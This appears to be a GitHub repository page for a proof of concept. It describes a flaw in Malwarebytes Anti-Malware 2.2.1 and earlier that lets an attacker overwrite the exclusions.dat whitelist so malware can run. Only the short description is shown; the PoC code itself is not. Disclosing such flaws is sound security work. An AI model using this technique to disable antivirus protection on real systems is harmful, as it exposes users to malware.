# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmspaling%2Fmbam-exclusions-poc-)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=mspaling%2Fmbam-exclusions-poc-)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mspaling](/mspaling)
/
**[mbam-exclusions-poc-](/mspaling/mbam-exclusions-poc-)**
Public

* [Notifications](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-)
* [Star
   0](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-)

Proof of concept python file that will overwrite a valid exclusions.dat with a crafted exclusions.dat which permits malicious files to run.

[0
stars](/mspaling/mbam-exclusions-poc-/stargazers) [0
forks](/mspaling/mbam-exclusions-poc-/forks) [Branches](/mspaling/mbam-exclusions-poc-/branches) [Tags](/mspaling/mbam-exclusions-poc-/tags) [Activity](/mspaling/mbam-exclusions-poc-/activity)
 [Star](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-)

 [Notifications](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-) You must be signed in to change notification settings

* [Code](/mspaling/mbam-exclusions-poc-)
* [Issues
  0](/mspaling/mbam-exclusions-poc-/issues)
* [Pull requests
  0](/mspaling/mbam-exclusions-poc-/pulls)
* [Actions](/mspaling/mbam-exclusions-poc-/actions)
* [Projects
  0](/mspaling/mbam-exclusions-poc-/projects)
* [Security](/mspaling/mbam-exclusions-poc-/security)
* [Insights](/mspaling/mbam-exclusions-poc-/pulse)

Additional navigation options

* [Code](/mspaling/mbam-exclusions-poc-)
* [Issues](/mspaling/mbam-exclusions-poc-/issues)
* [Pull requests](/mspaling/mbam-exclusions-poc-/pulls)
* [Actions](/mspaling/mbam-exclusions-poc-/actions)
* [Projects](/mspaling/mbam-exclusions-poc-/projects)
* [Security](/mspaling/mbam-exclusions-poc-/security)
* [Insights](/mspaling/mbam-exclusions-poc-/pulse)

# mspaling/mbam-exclusions-poc-

    master[Branches](/mspaling/mbam-exclusions-poc-/branches)[Tags](/mspaling/mbam-exclusions-poc-/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[3 Commits](/mspaling/mbam-exclusions-poc-/commits/master/) | | |
| [README.md](/mspaling/mbam-exclusions-poc-/blob/master/README.md "README.md") | | [README.md](/mspaling/mbam-exclusions-poc-/blob/master/README.md "README.md") |  |  |
| [mbam-whitelist-poc.txt](/mspaling/mbam-exclusions-poc-/blob/master/mbam-whitelist-poc.txt "mbam-whitelist-poc.txt") | | [mbam-whitelist-poc.txt](/mspaling/mbam-exclusions-poc-/blob/master/mbam-whitelist-poc.txt "mbam-whitelist-poc.txt") |  |  |
| View all files | | |

## Repository files navigation

* README

A vulnerability in the encryption and permission implementation of Malwarebytes Anti-Malware consumer version 2.2.1 and prior allows an
attacker to take control of the whitelisting feature (exclusions.dat under %SYSTEMDRIVE%\ProgramData) to permit execution of unauthorized
applications including malware and malicious websites.

## About

Proof of concept python file that will overwrite a valid exclusions.dat with a crafted exclusions.dat which permits malicious files to run.

### Resources

[Readme](#readme-ov-file)

[Activity](/mspaling/mbam-exclusions-poc-/activity)
### Stars

[**0**
stars](/mspaling/mbam-exclusions-poc-/stargazers)
### Watchers

[**1**
watching](/mspaling/mbam-exclusions-poc-/watchers)
### Forks

[**0**
forks](/mspaling/mbam-exclusions-poc-/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmspaling%2Fmbam-exclusions-poc-&report=mspaling+%28user%29)

## [Releases](/mspaling/mbam-exclusions-poc-/releases)

No releases published

## [Packages 0](/users/mspaling/packages?repo_name=mbam-exclusions-poc-)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


